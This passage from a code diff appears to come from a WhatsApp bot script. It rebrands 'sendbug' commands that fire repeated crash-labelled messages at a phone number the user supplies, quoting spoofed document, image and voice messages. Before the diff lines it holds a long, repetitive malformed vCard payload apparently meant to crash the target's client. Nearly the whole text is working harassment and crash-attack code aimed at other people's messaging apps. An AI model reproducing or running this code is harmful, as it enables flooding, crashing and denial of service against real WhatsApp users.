karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;type=HOME,INTERNET:+99879\nitem2.X-ABLabel:INTERNET\nitem3.ADR:;;Casa do karalho;;;;\nitem3.X-ABADR:ac\nitem3.X-ABLabel:Casa\nitem4.ADR:;;EMAIL\\;CHARSET=UTF-8\\;\nEND:VCARD` }}}		
 var messa = await prepareWAMessageMedia({ image: fs.readFileSync('./pict.jpg') }, { upload: haikal.waUploadToServer })
 var location = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
 "locationMessage": {
 						"degreesLatitude": -6.936928157735237,
 						"degreesLongitude": 107.72270679473877,
-						"caption": `© 𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍 ${philips}`,
+						"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 ${philips}`,
 						"jpegThumbnail": messa.imageMessage,
 }
 }), { userJid: m.chat, quoted: kontolfariz })
@@ -5382,41 +5312,26 @@ participant: `0@s.whatsapp.net`, ...({ remoteJid: "" })
 },
 message: {
 documentMessage: {
-title: `BY CXZA 935`, 
+title: `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 jpegThumbnail: fs.readFileSync(`./pict.jpg`),
 }
 }
 } 
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:fdoc})
 await m.reply(`Succes`)
 }
 break
@@ -5432,41 +5347,26 @@ participant: `0@s.whatsapp.net`,
 message: { 
 "imageMessage": { 
 "mimetype": "image/jpeg", 
-"caption": `CXZA 935`, 
+"caption": `© 𝐂𝐗𝐙𝐀 𝟗𝟑𝟓`, 
 "jpegThumbnail": thumb
 } 
 } 
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
+haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐂𝐗𝐙𝐀 𝟗𝟑𝟓 𝐆𝐄𝐓 𝐂𝐑𝐀𝐒𝐇"},{quoted:foto})
 await m.reply(`Succes`)
 break
 case 'sendbug3':
@@ -5486,36 +5386,21 @@ message: {
 }
 } 
 }
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
-haikal.sendMessage(`${text}@s.whatsapp.net`, {text:"𝐊𝐇𝐀𝐙𝐄𝟒𝟖𝟗𝐗𝟕-𝐕𝐎𝐋𝐔𝐓𝐈𝐎𝐍
-𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐄 𝐂𝐑𝐀𝐒𝐇"},{quoted:fvoc})
